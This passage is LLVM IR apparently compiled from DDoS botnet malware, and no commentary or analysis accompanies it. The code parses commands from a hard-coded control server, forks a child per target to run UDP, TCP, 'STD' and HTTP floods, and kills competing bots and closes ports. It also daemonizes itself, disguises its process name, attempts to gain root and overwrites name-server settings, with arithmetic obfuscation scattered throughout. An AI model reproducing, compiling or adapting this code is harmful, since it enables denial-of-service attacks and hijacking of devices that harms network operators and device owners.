  %204 = load i8*, i8** %203, align 8
  %205 = load i8**, i8*** %4, align 8
  %206 = getelementptr inbounds i8*, i8** %205, i64 5
  %207 = load i8*, i8** %206, align 8
  %208 = call i32 @atoi(i8* %207) #9
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 6
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @atoi(i8* %211) #9
  call void @sendHTTP(i8* %193, i8* %196, i16 zeroext %201, i8* %204, i32 %208, i32 %212)
  call void @exit(i32 0) #12
  unreachable

; <label>:213:                                    ; preds = %164
  %214 = load i8**, i8*** %4, align 8
  %215 = getelementptr inbounds i8*, i8** %214, i64 0
  %216 = load i8*, i8** %215, align 8
  %217 = call i32 @strcmp(i8* %216, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.313, i32 0, i32 0)) #9
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %316, label %219

; <label>:219:                                    ; preds = %213
  %220 = load i32, i32* %3, align 4
  %221 = icmp slt i32 %220, 6
  br i1 %221, label %255, label %222

; <label>:222:                                    ; preds = %219
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 3
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @atoi(i8* %225) #9
  %227 = icmp eq i32 %226, -1
  br i1 %227, label %255, label %228

; <label>:228:                                    ; preds = %222
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 2
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 @atoi(i8* %231) #9
  %233 = icmp eq i32 %232, -1
  br i1 %233, label %255, label %234

; <label>:234:                                    ; preds = %228
  %235 = load i8**, i8*** %4, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 4
  %237 = load i8*, i8** %236, align 8
  %238 = call i32 @atoi(i8* %237) #9
  %239 = icmp eq i32 %238, -1
  br i1 %239, label %255, label %240

; <label>:240:                                    ; preds = %234
  %241 = load i8**, i8*** %4, align 8
  %242 = getelementptr inbounds i8*, i8** %241, i64 4
  %243 = load i8*, i8** %242, align 8
  %244 = call i32 @atoi(i8* %243) #9
  %245 = icmp sgt i32 %244, 1024
  br i1 %245, label %255, label %246

; <label>:246:                                    ; preds = %240
  %247 = load i32, i32* %3, align 4
  %248 = icmp eq i32 %247, 6
  br i1 %248, label %249, label %256

; <label>:249:                                    ; preds = %246
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 5
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #9
  %254 = icmp slt i32 %253, 1
  br i1 %254, label %255, label %256

; <label>:255:                                    ; preds = %249, %240, %234, %228, %222, %219
  br label %560

; <label>:256:                                    ; preds = %249, %246
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 1
  %259 = load i8*, i8** %258, align 8
  store i8* %259, i8** %11, align 8
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 2
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #9
  store i32 %263, i32* %12, align 4
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 3
  %266 = load i8*, i8** %265, align 8
  %267 = call i32 @atoi(i8* %266) #9
  store i32 %267, i32* %13, align 4
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 4
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #9
  store i32 %271, i32* %14, align 4
  %272 = load i32, i32* %3, align 4
  %273 = icmp eq i32 %272, 6
  br i1 %273, label %274, label %279

; <label>:274:                                    ; preds = %256
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 5
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #9
  br label %280

; <label>:279:                                    ; preds = %256
  br label %280

; <label>:280:                                    ; preds = %279, %274
  %281 = phi i32 [ %278, %274 ], [ 10, %279 ]
  store i32 %281, i32* %15, align 4
  store i32 32, i32* %16, align 4
  %282 = load i8*, i8** %11, align 8
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %284 = icmp ne i8* %283, null
  br i1 %284, label %285, label %304

; <label>:285:                                    ; preds = %280
  %286 = load i8*, i8** %11, align 8
  %287 = call i8* @strtok(i8* %286, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %287, i8** %17, align 8
  br label %288

; <label>:288:                                    ; preds = %301, %285
  %289 = load i8*, i8** %17, align 8
  %290 = icmp ne i8* %289, null
  br i1 %290, label %291, label %303

; <label>:291:                                    ; preds = %288
  %292 = call i32 @listFork()
  %293 = icmp ne i32 %292, 0
  br i1 %293, label %301, label %294

; <label>:294:                                    ; preds = %291
  %295 = load i8*, i8** %17, align 8
  %296 = load i32, i32* %12, align 4
  %297 = load i32, i32* %13, align 4
  %298 = load i32, i32* %14, align 4
  %299 = load i32, i32* %15, align 4
  %300 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %295, i32 %296, i32 %297, i32 %298, i32 %299, i32 %300)
  call void @_exit(i32 0) #11
  unreachable

; <label>:301:                                    ; preds = %291
  %302 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %302, i8** %17, align 8
  br label %288

; <label>:303:                                    ; preds = %288
  br label %315

; <label>:304:                                    ; preds = %280
  %305 = call i32 @listFork()
  %306 = icmp ne i32 %305, 0
  br i1 %306, label %307, label %308

; <label>:307:                                    ; preds = %304
  br label %560

; <label>:308:                                    ; preds = %304
  %309 = load i8*, i8** %11, align 8
  %310 = load i32, i32* %12, align 4
  %311 = load i32, i32* %13, align 4
  %312 = load i32, i32* %14, align 4
  %313 = load i32, i32* %15, align 4
  %314 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %309, i32 %310, i32 %311, i32 %312, i32 %313, i32 %314)
  call void @_exit(i32 0) #11
  unreachable

; <label>:315:                                    ; preds = %303
  br label %316

; <label>:316:                                    ; preds = %315, %213
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 0
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @strcmp(i8* %319, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.314, i32 0, i32 0)) #9
  %321 = icmp ne i32 %320, 0
  br i1 %321, label %427, label %322

; <label>:322:                                    ; preds = %316
  %323 = load i32, i32* %3, align 4
  %324 = icmp slt i32 %323, 6
  br i1 %324, label %355, label %325

; <label>:325:                                    ; preds = %322
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 3
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #9
  %330 = icmp eq i32 %329, -1
  br i1 %330, label %355, label %331

; <label>:331:                                    ; preds = %325
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 2
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #9
  %336 = icmp eq i32 %335, -1
  br i1 %336, label %355, label %337

; <label>:337:                                    ; preds = %331
  %338 = load i32, i32* %3, align 4
  %339 = icmp sgt i32 %338, 5
  br i1 %339, label %340, label %346

; <label>:340:                                    ; preds = %337
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 5
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @atoi(i8* %343) #9
  %345 = icmp slt i32 %344, 0
  br i1 %345, label %355, label %346

; <label>:346:                                    ; preds = %340, %337
  %347 = load i32, i32* %3, align 4
  %348 = icmp eq i32 %347, 7
  br i1 %348, label %349, label %356

; <label>:349:                                    ; preds = %346
  %350 = load i8**, i8*** %4, align 8
  %351 = getelementptr inbounds i8*, i8** %350, i64 6
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @atoi(i8* %352) #9
  %354 = icmp slt i32 %353, 1
  br i1 %354, label %355, label %356

; <label>:355:                                    ; preds = %349, %340, %331, %325, %322
  br label %560

; <label>:356:                                    ; preds = %349, %346
  %357 = load i8**, i8*** %4, align 8
  %358 = getelementptr inbounds i8*, i8** %357, i64 1
  %359 = load i8*, i8** %358, align 8
  store i8* %359, i8** %18, align 8
  %360 = load i8**, i8*** %4, align 8
  %361 = getelementptr inbounds i8*, i8** %360, i64 2
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @atoi(i8* %362) #9
  store i32 %363, i32* %19, align 4
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 3
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #9
  store i32 %367, i32* %20, align 4
  %368 = load i8**, i8*** %4, align 8
  %369 = getelementptr inbounds i8*, i8** %368, i64 4
  %370 = load i8*, i8** %369, align 8
  store i8* %370, i8** %21, align 8
  %371 = load i32, i32* %3, align 4
  %372 = icmp eq i32 %371, 7
  br i1 %372, label %373, label %378

; <label>:373:                                    ; preds = %356
  %374 = load i8**, i8*** %4, align 8
  %375 = getelementptr inbounds i8*, i8** %374, i64 6
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 @atoi(i8* %376) #9
  br label %379

; <label>:378:                                    ; preds = %356
  br label %379

; <label>:379:                                    ; preds = %378, %373
  %380 = phi i32 [ %377, %373 ], [ 10, %378 ]
  store i32 %380, i32* %22, align 4
  %381 = load i32, i32* %3, align 4
  %382 = icmp sgt i32 %381, 5
  br i1 %382, label %383, label %388

; <label>:383:                                    ; preds = %379
  %384 = load i8**, i8*** %4, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 5
  %386 = load i8*, i8** %385, align 8
  %387 = call i32 @atoi(i8* %386) #9
  br label %389

; <label>:388:                                    ; preds = %379
  br label %389

; <label>:389:                                    ; preds = %388, %383
  %390 = phi i32 [ %387, %383 ], [ 0, %388 ]
  store i32 %390, i32* %23, align 4
  store i32 32, i32* %24, align 4
  %391 = load i8*, i8** %18, align 8
  %392 = call i8* @strstr(i8* %391, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %393 = icmp ne i8* %392, null
  br i1 %393, label %394, label %414

; <label>:394:                                    ; preds = %389
  %395 = load i8*, i8** %18, align 8
  %396 = call i8* @strtok(i8* %395, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %396, i8** %25, align 8
  br label %397

; <label>:397:                                    ; preds = %411, %394
  %398 = load i8*, i8** %25, align 8
  %399 = icmp ne i8* %398, null
  br i1 %399, label %400, label %413

; <label>:400:                                    ; preds = %397
  %401 = call i32 @listFork()
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %411, label %403

; <label>:403:                                    ; preds = %400
  %404 = load i8*, i8** %25, align 8
  %405 = load i32, i32* %19, align 4
  %406 = load i32, i32* %20, align 4
  %407 = load i8*, i8** %21, align 8
  %408 = load i32, i32* %23, align 4
  %409 = load i32, i32* %22, align 4
  %410 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %404, i32 %405, i32 %406, i8* %407, i32 %408, i32 %409, i32 %410)
  call void @_exit(i32 0) #11
  unreachable

; <label>:411:                                    ; preds = %400
  %412 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %412, i8** %25, align 8
  br label %397

; <label>:413:                                    ; preds = %397
  br label %426

; <label>:414:                                    ; preds = %389
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %414
  br label %560

; <label>:418:                                    ; preds = %414
  %419 = load i8*, i8** %18, align 8
  %420 = load i32, i32* %19, align 4
  %421 = load i32, i32* %20, align 4
  %422 = load i8*, i8** %21, align 8
  %423 = load i32, i32* %23, align 4
  %424 = load i32, i32* %22, align 4
  %425 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %419, i32 %420, i32 %421, i8* %422, i32 %423, i32 %424, i32 %425)
  call void @_exit(i32 0) #11
  unreachable

; <label>:426:                                    ; preds = %413
  br label %427

; <label>:427:                                    ; preds = %426, %316
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 0
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @strcmp(i8* %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.315, i32 0, i32 0)) #9
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %489, label %433

; <label>:433:                                    ; preds = %427
  %434 = load i32, i32* %3, align 4
  %435 = icmp slt i32 %434, 4
  br i1 %435, label %448, label %436

; <label>:436:                                    ; preds = %433
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 2
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* %439) #9
  %441 = icmp slt i32 %440, 1
  br i1 %441, label %448, label %442

; <label>:442:                                    ; preds = %436
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 3
  %445 = load i8*, i8** %444, align 8
  %446 = call i32 @atoi(i8* %445) #9
  %447 = icmp slt i32 %446, 1
  br i1 %447, label %448, label %449

; <label>:448:                                    ; preds = %442, %436, %433
  br label %560

; <label>:449:                                    ; preds = %442
  %450 = load i8**, i8*** %4, align 8
  %451 = getelementptr inbounds i8*, i8** %450, i64 1
  %452 = load i8*, i8** %451, align 8
  store i8* %452, i8** %26, align 8
  %453 = load i8**, i8*** %4, align 8
  %454 = getelementptr inbounds i8*, i8** %453, i64 2
  %455 = load i8*, i8** %454, align 8
  %456 = call i32 @atoi(i8* %455) #9
  store i32 %456, i32* %27, align 4
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 3
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #9
  store i32 %460, i32* %28, align 4
  %461 = load i8*, i8** %26, align 8
  %462 = call i8* @strstr(i8* %461, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %463 = icmp ne i8* %462, null
  br i1 %463, label %464, label %480

; <label>:464:                                    ; preds = %449
  %465 = load i8*, i8** %26, align 8
  %466 = call i8* @strtok(i8* %465, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %466, i8** %29, align 8
  br label %467

; <label>:467:                                    ; preds = %477, %464
  %468 = load i8*, i8** %29, align 8
  %469 = icmp ne i8* %468, null
  br i1 %469, label %470, label %479

; <label>:470:                                    ; preds = %467
  %471 = call i32 @listFork()
  %472 = icmp ne i32 %471, 0
  br i1 %472, label %477, label %473

; <label>:473:                                    ; preds = %470
  %474 = load i8*, i8** %29, align 8
  %475 = load i32, i32* %27, align 4
  %476 = load i32, i32* %28, align 4
  call void @SendSTD(i8* %474, i32 %475, i32 %476)
  call void @_exit(i32 0) #11
  unreachable

; <label>:477:                                    ; preds = %470
  %478 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %478, i8** %29, align 8
  br label %467

; <label>:479:                                    ; preds = %467
  br label %488

; <label>:480:                                    ; preds = %449
  %481 = call i32 @listFork()
  %482 = icmp ne i32 %481, 0
  br i1 %482, label %483, label %484

; <label>:483:                                    ; preds = %480
  br label %560

; <label>:484:                                    ; preds = %480
  %485 = load i8*, i8** %26, align 8
  %486 = load i32, i32* %27, align 4
  %487 = load i32, i32* %28, align 4
  call void @SendSTD(i8* %485, i32 %486, i32 %487)
  call void @_exit(i32 0) #11
  unreachable

; <label>:488:                                    ; preds = %479
  br label %489

; <label>:489:                                    ; preds = %488, %427
  %490 = load i8**, i8*** %4, align 8
  %491 = getelementptr inbounds i8*, i8** %490, i64 0
  %492 = load i8*, i8** %491, align 8
  %493 = call i32 @strcmp(i8* %492, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.316, i32 0, i32 0)) #9
  %494 = icmp ne i32 %493, 0
  br i1 %494, label %496, label %495

; <label>:495:                                    ; preds = %489
  call void @bot_killer()
  call void @port_closer()
  br label %496

; <label>:496:                                    ; preds = %495, %489
  %497 = load i8**, i8*** %4, align 8
  %498 = getelementptr inbounds i8*, i8** %497, i64 0
  %499 = load i8*, i8** %498, align 8
  %500 = call i32 @strcmp(i8* %499, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0)) #9
  %501 = icmp ne i32 %500, 0
  br i1 %501, label %543, label %502

; <label>:502:                                    ; preds = %496
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %503

; <label>:503:                                    ; preds = %532, %502
  %504 = load i64, i64* %31, align 8
  %505 = load i64, i64* @numpids, align 8
  %506 = icmp ult i64 %504, %505
  br i1 %506, label %507, label %537

; <label>:507:                                    ; preds = %503
  %508 = load i32*, i32** @pids, align 8
  %509 = load i64, i64* %31, align 8
  %510 = getelementptr inbounds i32, i32* %508, i64 %509
  %511 = load i32, i32* %510, align 4
  %512 = icmp ne i32 %511, 0
  br i1 %512, label %513, label %531

; <label>:513:                                    ; preds = %507
  %514 = load i32*, i32** @pids, align 8
  %515 = load i64, i64* %31, align 8
  %516 = getelementptr inbounds i32, i32* %514, i64 %515
  %517 = load i32, i32* %516, align 4
  %518 = call i32 @getpid() #5
  %519 = icmp ne i32 %517, %518
  br i1 %519, label %520, label %531

; <label>:520:                                    ; preds = %513
  %521 = load i32*, i32** @pids, align 8
  %522 = load i64, i64* %31, align 8
  %523 = getelementptr inbounds i32, i32* %521, i64 %522
  %524 = load i32, i32* %523, align 4
  %525 = call i32 @kill(i32 %524, i32 9) #5
  %526 = load i32, i32* %30, align 4
  %527 = add i32 %526, -248818034
  %528 = add i32 %527, 1
  %529 = sub i32 %528, -248818034
  %530 = add nsw i32 %526, 1
  store i32 %529, i32* %30, align 4
  br label %531

; <label>:531:                                    ; preds = %520, %513, %507
  br label %532

; <label>:532:                                    ; preds = %531
  %533 = load i64, i64* %31, align 8
  %534 = sub i64 0, 1
  %535 = sub i64 %533, %534
  %536 = add i64 %533, 1
  store i64 %535, i64* %31, align 8
  br label %503

; <label>:537:                                    ; preds = %503
  %538 = load i32, i32* %30, align 4
  %539 = icmp sgt i32 %538, 0
  br i1 %539, label %540, label %541

; <label>:540:                                    ; preds = %537
  br label %542

; <label>:541:                                    ; preds = %537
  br label %542

; <label>:542:                                    ; preds = %541, %540
  br label %543

; <label>:543:                                    ; preds = %542, %496
  %544 = load i8**, i8*** %4, align 8
  %545 = getelementptr inbounds i8*, i8** %544, i64 0
  %546 = load i8*, i8** %545, align 8
  %547 = call i32 @strcmp(i8* %546, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.318, i32 0, i32 0)) #9
  %548 = icmp ne i32 %547, 0
  br i1 %548, label %550, label %549

; <label>:549:                                    ; preds = %543
  call void @exit(i32 0) #12
  unreachable

; <label>:550:                                    ; preds = %543
  %551 = load i8**, i8*** %4, align 8
  %552 = getelementptr inbounds i8*, i8** %551, i64 0
  %553 = load i8*, i8** %552, align 8
  %554 = call i32 @strcmp(i8* %553, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.319, i32 0, i32 0)) #9
  %555 = icmp ne i32 %554, 0
  br i1 %555, label %560, label %556

; <label>:556:                                    ; preds = %550
  call void @RemoveTempDirs()
  %557 = load i32, i32* @mainCommSock, align 4
  %558 = call i8* @getBuild()
  %559 = call i32 (i32, i8*, ...) @sockprintf(i32 %557, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.320, i32 0, i32 0), i8* %558)
  br label %560

; <label>:560:                                    ; preds = %556, %550, %483, %448, %417, %355, %307, %255, %189, %185, %162, %143, %130, %69, %64, %37
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 512, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %0
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = call i32 @close(i32 %7)
  store i32 0, i32* @mainCommSock, align 4
  br label %9

; <label>:9:                                      ; preds = %6, %0
  %10 = load i32, i32* @currentServer, align 4
  %11 = add i32 %10, -1322342590
  %12 = add i32 %11, 1
  %13 = sub i32 %12, -1322342590
  %14 = add nsw i32 %10, 1
  %15 = sext i32 %13 to i64
  %16 = icmp eq i64 %15, 1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %9
  store i32 0, i32* @currentServer, align 4
  br label %24

; <label>:18:                                     ; preds = %9
  %19 = load i32, i32* @currentServer, align 4
  %20 = sub i32 %19, 125276932
  %21 = add i32 %20, 1
  %22 = add i32 %21, 125276932
  %23 = add nsw i32 %19, 1
  store i32 %22, i32* @currentServer, align 4
  br label %24

; <label>:24:                                     ; preds = %18, %17
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %26 = load i32, i32* @currentServer, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %27
  %29 = load i8*, i8** %28, align 8
  %30 = call i8* @strcpy(i8* %25, i8* %29) #5
  %31 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %31, i32* @mainCommSock, align 4
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = load i32, i32* @port, align 4
  %35 = call i32 @connectTimeout(i32 %32, i8* %33, i32 %34, i32 30)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %38, label %37

; <label>:37:                                     ; preds = %24
  store i32 1, i32* %1, align 4
  br label %39

; <label>:38:                                     ; preds = %24
  store i32 0, i32* %1, align 4
  br label %39

; <label>:39:                                     ; preds = %38, %37
  %40 = load i32, i32* %1, align 4
  ret i32 %40
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.322, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, -1
  %40 = and i64 %38, %39
  %41 = xor i64 %38, -1
  %42 = and i64 %36, %41
  %43 = or i64 %40, %42
  %44 = xor i64 %36, %38
  %45 = trunc i64 %43 to i32
  call void @srand(i32 %45) #5
  %46 = call i64 @time(i64* null) #5
  %47 = call i32 @getpid() #5
  %48 = sext i32 %47 to i64
  %49 = xor i64 %46, -1
  %50 = and i64 %48, %49
  %51 = xor i64 %48, -1
  %52 = and i64 %46, %51
  %53 = or i64 %50, %52
  %54 = xor i64 %46, %48
  %55 = trunc i64 %53 to i32
  call void @init_rand(i32 %55)
  %56 = call i32 @fork() #5
  store i32 %56, i32* %7, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %2
  %59 = load i32, i32* %7, align 4
  %60 = call i32 @waitpid(i32 %59, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:61:                                     ; preds = %2
  %62 = load i32, i32* %7, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %75, label %64

; <label>:64:                                     ; preds = %61
  %65 = call i32 @fork() #5
  store i32 %65, i32* %8, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %64
  call void @exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* %8, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %72, label %71

; <label>:71:                                     ; preds = %68
  br label %73

; <label>:72:                                     ; preds = %68
  br label %73

; <label>:73:                                     ; preds = %72, %71
  br label %74

; <label>:74:                                     ; preds = %73
  br label %390

; <label>:75:                                     ; preds = %61
  %76 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.323, i32 0, i32 0)) #5
  %77 = call i32 @setuid(i32 0) #5
  %78 = call i32 @seteuid(i32 0) #5
  %79 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %80

; <label>:80:                                     ; preds = %86, %75
  %81 = call i32 @fork() #5
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %389

; <label>:83:                                     ; preds = %80
  %84 = call i32 @initConnection()
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %86, label %88

; <label>:86:                                     ; preds = %83
  %87 = call i32 @sleep(i32 5)
  br label %80

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = call i8* @getBuild()
  %91 = call i32 (i32, i8*, ...) @sockprintf(i32 %89, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.324, i32 0, i32 0), i8* %90)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  call void @bot_killer()
  call void @port_closer()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %92

; <label>:92:                                     ; preds = %387, %238, %202, %88
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %95 = call i32 @recvLine(i32 %93, i8* %94, i32 4096)
  store i32 %95, i32* %11, align 4
  %96 = icmp ne i32 %95, -1
  br i1 %96, label %97, label %388

; <label>:97:                                     ; preds = %92
  store i32 0, i32* %12, align 4
  br label %98

; <label>:98:                                     ; preds = %188, %97
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = load i64, i64* @numpids, align 8
